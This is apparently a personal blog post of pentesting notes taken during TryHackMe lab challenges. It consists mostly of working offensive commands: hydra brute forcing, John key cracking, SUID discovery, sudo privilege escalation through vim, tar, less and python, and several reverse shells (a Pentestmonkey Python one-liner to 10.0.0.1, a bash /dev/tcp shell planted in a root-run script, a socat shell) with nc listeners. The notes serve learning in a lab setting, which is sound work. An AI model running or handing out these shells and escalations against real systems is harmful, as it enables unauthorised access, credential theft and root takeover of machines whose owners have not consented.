---
title: "Basic Cybersecurity Notes"
date: 2021-12-04T21:03:50+01:00
---

# Introduction 

This post contains some notes I have taken while doing some THM(Try Hack Me) challenges 

# NMAP Basic scan with outfile 

nmap -sC -sV -oN /path/to/file ip

# Enum4linux-ng


**_enumerating smb clients and servers_**

_use example_

python3 enum4linux-ng.py -U -A -R ip

# Hydra example

hydra -l username -P /path/to/wordlist proto://ip

# Cracking the passphrase of an rsa key with John

sh2john.py rsa_file > file.txt
john file.txt

# Checkin for suid on a system run the following commands
find / -perm -u=s -type f 2>/dev/null

# Different ways to read a file

while read line; do echo $line done; < file
cat file
grep . file


# Pentestmonkey reverse shell examples
_in python it would be, note that if the machine doesnt have python2 installed(modern machines) it works with python3_

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


# Privilege scalation with vim

there are 2 ways of running a shell as root with vim

## _First option_
sudo vim 
 -> :set shell=/bin/sh
 -> :shell

## _Second option_
sudo vim -c ':!/bin/sh'


# Privilege scalation with tar

If the user is allowed in the sudoers file we can easily become root by running _sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh_

# Using and understanding netcat

to set up a listening port in nc

nc -lnvp portnumber

# Read pcaps

Could use wireshark

If you are looking for a password strings will just do the job for it and it will provide more clarity

# Bash remote shell

echo 'bash -c "bash -i >& /dev/tcp/ip/port 0>&1"' > /path/to/script run by root

# Privesc with less
you can run less with _sudo_ against a file and enter in less's command mode by typing !/bin/sh

Example

sudo less file.log
!/bin/sh

# GTFOs bin with python

In order to get a privileged shell with python (only if it has the suid set) we can run

python -c 'import os; os.system("/bin/sh")'

# Stable shell with pty

When we stabblish the first shell with nc it tends not to have a pty which for some porcesses it can be stressful

to solve that you can run this python adhoc command python -c 'import pty; pty.spawn("/bin/bash")' which gets you a tty that lets you freely run all the commands you need without prompting any error nor warning about not having a tty


# Socat GTFO bin

To get a remote shell on a machine using socat you need to run this
this is run on your local machine

socat file:`tty`,raw,echo=0 tcp-listen:$port

this is run on the remote machine
sudo /usr/bin/socat tcp-connect:$yourIP:$yourport exec:sh,pty,stderr,setsid,sigint,sane
